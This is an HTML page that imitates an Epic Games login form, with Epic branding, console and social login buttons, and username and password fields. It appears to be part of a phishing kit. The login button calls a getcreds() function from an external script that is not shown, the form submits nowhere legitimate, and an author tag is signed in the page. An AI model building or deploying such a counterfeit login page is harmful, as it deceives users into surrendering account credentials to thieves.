<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/epicstyle.css">
    <title>Login Form</title>
    <link href="https://fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
    <link rel="icon" href="Images/logo_epic.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" charset="utf-8"></script>
    <script src="script/myjs.js"></script>
</head>
<body>
    <div class="login-form">
        
        <div class="logo"><img src="Images/logo_epic.png" alt="logo"></div>

        <div class="social-media">
            <button class="fb"><img src="Images/fb_epic.png" alt="facebook"></button>
            <button class="google"><img src="Images/google_epic.png" alt="google"></button>
            <button class="ps"><img src="Images/ps_epic.png" alt="ps"></button>
            <button class="xbox"><img src="Images/xbox_epic.png" alt="xbox"></button>
            <button class="switch"><img src="Images/switch_epic.png" alt="switch"></button>
        </div>

        <h6>Sign In</h6>

        <form action="">
            
            <div class="textbox">
                <input type="text" id="username" placeholder="Username or Gmail">
                <span class="check-message hidden">Required</span>
            </div>

            <div class="textbox">
                <input type="password" name="password" placeholder="Password" id="passwd">
                <span class="check-message hidden">Required</span>
            </div>

            <div class="options">
                <label class="remember-me">
                    <span class="checkbox">
                        <input type="checkbox">
                        <span class="checked"></span>
                    </span>
                    Remember Me
                </label>
                <a href="">forgot your password</a>
            </div>

            <input type="button" value="Log In Now" class="login-btn" disabled onclick=getcreds()>

            <div class="privacy-link">
                <a href="">Private Policy</a>
            </div>
        </form>

        <div class="dont-have-account">
            Don't have a Epic Games Account ? 
            <a href="">Sign Up</a>
        </div>

        <div class="name">
            ~ APKALESS THE SOLDIER ~
        </div>
    </div>

    <script type="text/javascript">
        $(".textbox input").focusout(function(){
            if($(this).val() == ""){
                $(this).siblings().removeClass("hidden");
                $(this).css("background","#554343");
            }else{
                $(this).siblings().addClass("hidden");
                $(this).css("background","#484848");
            }
        });

        $(".textbox input").keyup(function(){
            var inputs = $(".textbox input");
            if(inputs[0].value != "" && inputs[1].value){
                $(".login-btn").attr("disabled",false);
                $(".login-btn").addClass("active");
            }else {
                $(".login-btn").attr("disabled",true);
                $(".login-btn").removeClass("active")
            }
        });
    </script>
</body>
</html>
